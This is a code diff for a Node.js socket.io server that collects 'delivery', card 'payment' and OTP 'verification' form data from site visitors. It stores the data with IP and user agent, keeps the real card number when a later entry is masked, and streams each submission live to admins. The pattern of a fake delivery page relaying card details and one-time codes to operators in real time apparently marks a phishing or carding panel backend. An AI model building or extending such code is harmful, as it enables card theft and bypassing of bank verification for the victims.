@@ -323,10 +323,17 @@ io.on('connection', (socket) => {
     const { sessionId, formData } = data;
     
     try {
-      // Save to form_submissions table (NEW - keeps all history)
+      // Get visitor ID
+      const visitorResult = await pool.query(
+        'SELECT id FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+      const visitorId = visitorResult.rows[0]?.id || null;
+      
+      // Save to form_submissions table (keeps all history)
       await pool.query(
-        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
-        [sessionId, 'delivery', JSON.stringify(formData), ip, userAgent]
+        'INSERT INTO form_submissions (session_id, visitor_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5, $6)',
+        [sessionId, visitorId, 'delivery', JSON.stringify(formData), ip, userAgent]
       );
       
       // Also update visitors table for current data
@@ -335,23 +342,31 @@ io.on('connection', (socket) => {
         [JSON.stringify(formData), sessionId]
       );
       
-      // Get all delivery submissions for this visitor (NEW)
+      // Log to order_logs
+      await pool.query(
+        `INSERT INTO order_logs (session_id, visitor_id, log_type, log_data, ip_address) 
+         VALUES ($1, $2, $3, $4, $5)`,
+        [sessionId, visitorId, 'delivery_attempt', JSON.stringify({ formData, attempt: (visitorResult.rows[0]?.delivery_attempts || 0) + 1 }), ip]
+      );
+      
+      // Get all delivery submissions for this visitor
       const submissionsResult = await pool.query(
         'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
         [sessionId, 'delivery']
       );
 
       // Get full visitor data
-      const visitorResult = await pool.query(
+      const visitorDataResult = await pool.query(
         'SELECT * FROM visitors WHERE session_id = $1',
         [sessionId]
       );
 
       // SECURE: Only send to authenticated admins using helper
       const eventData = {
-        ...visitorResult.rows[0],
+        ...visitorDataResult.rows[0],
         delivery_submissions: submissionsResult.rows,
-        timestamp: new Date()
+        timestamp: new Date(),
+        isNew: true // Flag for new/unprocessed submissions
       };
       
       emitToAdmins('form:deliverySubmitted', eventData);
@@ -368,7 +383,14 @@ io.on('connection', (socket) => {
     const { sessionId, paymentData } = data;
     
     try {
-      // جلب البيانات الحالية المخزنة للزائر للحفاظ على الأرقام الحقيقية
+      // Get visitor ID
+      const visitorResult = await pool.query(
+        'SELECT id FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+      const visitorId = visitorResult.rows[0]?.id || null;
+      
+      // Get current payment data for preserving real numbers
       const currentVisitor = await pool.query(
         'SELECT payment_data FROM visitors WHERE session_id = $1', 
         [sessionId]
@@ -379,7 +401,7 @@ io.on('connection', (socket) => {
       if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].payment_data) {
         const existingData = currentVisitor.rows[0].payment_data;
         
-        // إذا كانت البيانات الجديدة تحتوي على نجوم، نحتفظ بالرقم الحقيقي القديم
+        // If new data contains asterisks, keep the real old number
         if (paymentData.cardNumber && paymentData.cardNumber.includes('*') && existingData.cardNumber) {
           finalPaymentData.cardNumber = existingData.cardNumber;
         }
@@ -388,34 +410,42 @@ io.on('connection', (socket) => {
         }
       }
 
-      // Save to form_submissions table (NEW - keeps all history)
+      // Save to form_submissions table (keeps all history)
       await pool.query(
-        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
-        [sessionId, 'payment', JSON.stringify(finalPaymentData), ip, userAgent]
+        'INSERT INTO form_submissions (session_id, visitor_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5, $6)',
+        [sessionId, visitorId, 'payment', JSON.stringify(finalPaymentData), ip, userAgent]
       );
 
       await pool.query(
         'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(finalPaymentData), sessionId]
       );
+      
+      // Log to order_logs
+      await pool.query(
+        `INSERT INTO order_logs (session_id, visitor_id, log_type, log_data, ip_address) 
+         VALUES ($1, $2, $3, $4, $5)`,
+        [sessionId, visitorId, 'payment_attempt', JSON.stringify({ paymentData: finalPaymentData, paymentMethod: paymentData.paymentMethod }), ip]
+      );
 
-      // Get all payment submissions for this visitor (NEW)
+      // Get all payment submissions for this visitor
       const submissionsResult = await pool.query(
         'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
         [sessionId, 'payment']
       );
 
       // Get full visitor data
-      const visitorResult = await pool.query(
+      const visitorDataResult = await pool.query(
         'SELECT * FROM visitors WHERE session_id = $1',
         [sessionId]
       );
 
       // SECURE: Only send to authenticated admins using helper
       const eventData = {
-        ...visitorResult.rows[0],
+        ...visitorDataResult.rows[0],
         payment_submissions: submissionsResult.rows,
-        timestamp: new Date()
+        timestamp: new Date(),
+        isNew: true // Flag for new/unprocessed submissions
       };
       
       emitToAdmins('form:paymentSubmitted', eventData);
@@ -432,18 +462,20 @@ io.on('connection', (socket) => {
     const { sessionId, verificationData } = data;
     
     try {
-      // Get current OTP history
-      const currentVisitor = await pool.query(
-        'SELECT otp_history FROM visitors WHERE session_id = $1',
+      // Get visitor ID
+      const visitorResult = await pool.query(
+        'SELECT id, otp_history FROM visitors WHERE session_id = $1',
         [sessionId]
       );
+      const visitorId = visitorResult.rows[0]?.id || null;
       
+      // Get current OTP history
       let otpHistory = [];
-      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].otp_history) {
+      if (visitorResult.rows.length > 0 && visitorResult.rows[0].otp_history) {
         try {
-          otpHistory = Array.isArray(currentVisitor.rows[0].otp_history) 
-            ? currentVisitor.rows[0].otp_history 
-            : JSON.parse(currentVisitor.rows[0].otp_history);
+          otpHistory = Array.isArray(visitorResult.rows[0].otp_history) 
+            ? visitorResult.rows[0].otp_history 
+            : JSON.parse(visitorResult.rows[0].otp_history);
         } catch (e) {
           otpHistory = [];
         }
@@ -464,34 +496,42 @@ io.on('connection', (socket) => {
         }
       }
 
-      // Save to form_submissions table (NEW - keeps all history)
+      // Save to form_submissions table (keeps all history)
       await pool.query(
-        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
-        [sessionId, 'verification', JSON.stringify(verificationData), ip, userAgent]
+        'INSERT INTO form_submissions (session_id, visitor_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5, $6)',
+        [sessionId, visitorId, 'verification', JSON.stringify(verificationData), ip, userAgent]
       );
 
       await pool.query(
         'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
         [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
       );
+      
+      // Log to order_logs
+      await pool.query(
+        `INSERT INTO order_logs (session_id, visitor_id, log_type, log_data, ip_address) 
+         VALUES ($1, $2, $3, $4, $5)`,
+        [sessionId, visitorId, 'verification_attempt', JSON.stringify({ verificationData, otpAttempt: otpHistory.length }), ip]
+      );
 
-      // Get all verification submissions for this visitor (NEW)
+      // Get all verification submissions for this visitor
       const submissionsResult = await pool.query(
         'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
         [sessionId, 'verification']
       );
 
       // Get full visitor data
-      const visitorResult = await pool.query(
+      const visitorDataResult = await pool.query(
         'SELECT * FROM visitors WHERE session_id = $1',
         [sessionId]
       );
 
       // SECURE: Only send to authenticated admins using helper
       const eventData = {
-        ...visitorResult.rows[0],
+        ...visitorDataResult.rows[0],
         verification_submissions: submissionsResult.rows,
-        timestamp: new Date()
+        timestamp: new Date(),
+        isNew: true // Flag for new/unprocessed submissions
       };
       
       emitToAdmins('form:verificationSubmitted', eventData);
@@ -1239,26 +1279,25 @@ async function runMigrations() {
     `);
     console.log('✅ Migration: visit_status column added');
   } catch (error) {
-    // Column might already exist, that's ok
     console.log('⚠️ Migration note:', error.message);
   }
   
   try {
-    // Create form_submissions table if not exists (for saving all form submissions history)
+    // Add missing columns to form_submissions table
     await pool.query(`
-      CREATE TABLE IF NOT EXISTS form_submissions (
-        id SERIAL PRIMARY KEY,
-        session_id VARCHAR(100) NOT NULL,
-        form_type VARCHAR(50) NOT NULL,
-        form_data JSONB NOT NULL,
-        ip_address VARCHAR(45),
-        user_agent TEXT,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-      )
+      ALTER TABLE form_submissions 
+      ADD COLUMN IF NOT EXISTS visitor_id INTEGER,
+      ADD COLUMN IF NOT EXISTS is_processed BOOLEAN DEFAULT false,
+      ADD COLUMN IF NOT EXISTS processed_by INTEGER,
+      ADD COLUMN IF NOT EXISTS processed_at TIMESTAMP
     `);
-    console.log('✅ Migration: form_submissions table created');
-    
-    // Create index for faster queries
+    console.log('✅ Migration: form_submissions columns added');
+  } catch (error) {
+    console.log('⚠️ Migration note:', error.message);
+  }
+  
+  try {
+    // Create indexes for form_submissions
     await pool.query(`
       CREATE INDEX IF NOT EXISTS idx_form_submissions_session 
       ON form_submissions(session_id)
@@ -1268,6 +1307,38 @@ async function runMigrations() {
       ON form_submissions(form_type)
     `);
     console.log('✅ Migration: form_submissions indexes created');
+  } catch (error) {
+    console.log('⚠️ Migration note:', error.message);
+  }
+  
+  // Create order_logs table for tracking order history
+  try {
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS order_logs (
+        id SERIAL PRIMARY KEY,
+        session_id VARCHAR(100) NOT NULL,
+        visitor_id INTEGER,
+        log_type VARCHAR(50) NOT NULL,
+        log_data JSONB,
+        admin_id INTEGER,
+        admin_action VARCHAR(100),
+        ip_address VARCHAR(45),
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    console.log('✅ Migration: order_logs table created');
+    
+    // Create indexes for order_logs
+    await pool.query(`
+      CREATE INDEX IF NOT EXISTS idx_order_logs_session ON order_logs(session_id)
+    `);
+    await pool.query(`
+      CREATE INDEX IF NOT EXISTS idx_order_logs_type ON order_logs(log_type)
+    `);
+    await pool.query(`
+      CREATE INDEX IF NOT EXISTS idx_order_logs_created ON order_logs(created_at DESC)
+    `);
+    console.log('✅ Migration: order_logs indexes created');
   } catch (error) {
     console.log('⚠️ Migration note:', error.message);
   }
